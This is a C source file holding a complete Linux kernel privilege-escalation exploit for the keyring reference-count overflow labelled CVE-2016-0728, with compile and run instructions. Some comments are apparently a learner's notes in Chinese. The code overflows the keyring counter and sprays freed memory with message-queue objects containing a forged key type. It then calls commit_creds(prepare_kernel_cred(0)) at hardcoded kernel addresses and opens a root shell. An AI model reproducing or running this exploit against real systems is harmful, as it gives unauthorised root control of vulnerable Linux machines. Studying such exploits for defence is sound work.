/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */
/* $ ./cve_2016_072 PP_KEY */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <keyutils.h>
#include <unistd.h>
#include <time.h>
#include <unistd.h>

#include <sys/ipc.h>
#include <sys/msg.h>

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

#define STRUCT_LEN (0xb8 - 0x30)
#define COMMIT_CREDS_ADDR (0xffffffff81094250)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)



struct key_type {
    char * name;
    size_t datalen;
    void * vet_description;
    void * preparse;
    void * free_preparse;
    void * instantiate;
    void * update;
    void * match_preparse;
    void * match_free;
    void * revoke;
    void * destroy;
};

void userspace_revoke(void * key) {
    commit_creds(prepare_kernel_cred(0));
}

int main(int argc, const char *argv[]) {
	const char *keyring_name;
	size_t i = 0;
    unsigned long int l = 0x100000000/2;
	key_serial_t serial = -1;
	pid_t pid = -1;
    struct key_type * my_key_type = NULL;
    
struct { long mtype;
		char mtext[STRUCT_LEN];
	} msg = {0x4141414141414141, {0}};
	int msqid;

	if (argc != 2) {
		puts("usage: ./keys <key_name>");
		return 1;
	}

    printf("uid=%d, euid=%d\n", getuid(), geteuid()); 
    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;
    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;
    
    my_key_type = malloc(sizeof(*my_key_type));

    my_key_type->revoke = (void*)userspace_revoke;
    memset(msg.mtext, 'A', sizeof(msg.mtext));

    // key->uid
    *(int*)(&msg.mtext[56]) = 0x3e8; /* geteuid() */
    //key->perm
    *(int*)(&msg.mtext[64]) = 0x3f3f3f3f;

    //key->type
    *(unsigned long *)(&msg.mtext[80]) = (unsigned long)my_key_type;

	//key是IPC_PRIVATE，所以创建一个新的消息队列。
	//todo:这里的msgget的意义是什么？
    if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }

    keyring_name = argv[1];

	/* Set the new session keyring before we start */

	//Each process can create a keyring for the current session using keyctl(KEYCTL_JOIN_SESSION_KEYRING, name) 
	//and can choose to either assign a name to the keyring or not by passing NULL.
	//为当前的进程创建了一个keyring
	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
	if (serial < 0) {
		perror("keyctl");
		return -1;
    }
	//KEYCTL_SETPERM:Set perms on a key.
	/*
		#define KEY_POS_VIEW    0x01000000   possessor can view a key's attributes 
		#define KEY_POS_READ    0x02000000       possessor can read key payload / view keyring 
		#define KEY_POS_WRITE   0x04000000       possessor can update key payload / add link to keyring 
		#define KEY_POS_SEARCH  0x08000000       possessor can find a key in search / search a keyring 
		#define KEY_POS_LINK    0x10000000       possessor can create a link to a key/keyring 
		#define KEY_POS_SETATTR 0x20000000       possessor can set key attributes 
		#define KEY_POS_ALL     0x3f000000

		#define KEY_USR_VIEW    0x00010000      user permissions... 
		#define KEY_USR_READ    0x00020000
		#define KEY_USR_WRITE   0x00040000
		#define KEY_USR_SEARCH  0x00080000
		#define KEY_USR_LINK    0x00100000
		#define KEY_USR_SETATTR 0x00200000
		#define KEY_USR_ALL     0x003f0000

		#define KEY_GRP_VIEW    0x00000100       group permissions... 
		#define KEY_GRP_READ    0x00000200
		#define KEY_GRP_WRITE   0x00000400
		#define KEY_GRP_SEARCH  0x00000800
		#define KEY_GRP_LINK    0x00001000
		#define KEY_GRP_SETATTR 0x00002000
		#define KEY_GRP_ALL     0x00003f00

		#define KEY_OTH_VIEW    0x00000001       third party permissions... 
		#define KEY_OTH_READ    0x00000002
		#define KEY_OTH_WRITE   0x00000004
		#define KEY_OTH_SEARCH  0x00000008
		#define KEY_OTH_LINK    0x00000010
		#define KEY_OTH_SETATTR 0x00000020
		#define KEY_OTH_ALL     0x0000003f
	*/
	if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
		perror("keyctl");
		return -1;
	}


	//不断的分配keyring，导致keyring的计数器溢出。
	// 为什么要分成两段
	puts("Increfing...");
    for (i = 1; i < 0xfffffffd; i++) {
        if (i == (0xffffffff - l)) {
            l = l/2;
            sleep(5);
        }
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
            perror("keyctl");
            return -1;
        }
    }
    sleep(5);
    /* here we are going to leak the last references to overflow */
    for (i=0; i<5; ++i) {
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
            perror("keyctl");
            return -1;
        }
    }

    puts("finished increfing");
    puts("forking...");
    /* allocate msg struct in the kernel rewriting the freed keyring object */
    for (i=0; i<64; i++) {
        pid = fork();
        if (pid == -1) {
            perror("fork");
            return -1;
        }

        if (pid == 0) {
            sleep(2);
            if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
                perror("msgget");
                exit(1);
            }
            for (i = 0; i < 64; i++) {
                if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
                    perror("msgsnd");
                    exit(1);
                }
            }
            sleep(-1);
            exit(1);
        }
    }
   
    puts("finished forking");
    sleep(5);

    /* call userspace_revoke from kernel */
    puts("caling revoke...");
    if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
        perror("keyctl_revoke");
    }

    printf("uid=%d, euid=%d\n", getuid(), geteuid());
    execl("/bin/sh", "/bin/sh", NULL);

    return 0;
}
